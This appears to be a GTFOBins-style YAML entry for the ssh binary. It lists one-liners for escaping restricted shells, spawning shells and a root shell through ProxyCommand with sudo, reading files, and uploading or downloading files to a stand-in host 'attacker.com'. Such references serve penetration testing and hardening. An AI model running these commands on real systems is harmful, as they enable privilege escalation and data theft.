---
functions:
  shell:
    - description: Reconnecting may help bypassing restricted shells.
      code: ssh localhost $SHELL --noprofile --norc
    - description: Spawn interactive shell through ProxyCommand option.
      code: ssh -o ProxyCommand=';sh 0<&2 1>&2' x
  file-upload:
    - description: Send local file to a SSH server.
      code: |
        HOST=user@attacker.com
        RPATH=file_to_save
        LPATH=file_to_send
        ssh $HOST "cat > $RPATH" < $LPATH
  file-download:
    - description: Fetch a remote file from a SSH server.
      code: |
        HOST=user@attacker.com
        RPATH=file_to_get
        LPATH=file_to_save
        ssh $HOST "cat $RPATH" > $LPATH
  file-read:
    - description: The read file content is corrupted by error prints.
      code: |
        LFILE=file_to_read
        ssh -F $LFILE localhost
  sudo:
    - description: Spawn interactive root shell through ProxyCommand option.
      code: sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
---
